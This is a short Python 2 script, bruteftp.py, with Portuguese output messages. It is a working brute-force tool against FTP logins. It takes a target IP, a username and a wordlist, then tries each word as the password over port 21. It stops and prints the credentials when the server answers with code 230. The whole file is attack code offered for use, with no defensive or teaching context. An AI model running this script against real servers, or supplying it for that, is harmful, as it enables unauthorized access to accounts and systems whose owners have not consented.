#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket,sys,re

if len(sys.argv) != 4:
	print "Modo de uso: python bruteftp.py 127.0.0.1 usuario wordlist.txt"
	sys.exit()

target = sys.argv[1]
usuario = sys.argv[2]

f = open(sys.argv[3])
for palavra in f.readlines():

	print "Realizando Bruteforce FTP: %s:%s"%(usuario,palavra)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,21))
	s.recv(1024)

	s.send("USER "+usuario+"\r\n")
	s.recv(1024)
	s.send("PASS "+palavra+"\r\n")
	resposta = s.recv(1024)
	print resposta
	s.send("QUIT\r\n")

	if re.search('230', resposta):
		print "[+] Senha encontrada, Dados de Acesso: %s:%s"%(usuario,palavra)
		break
else:
	print ""
	print "[-] A senha nao foi encontrada!"

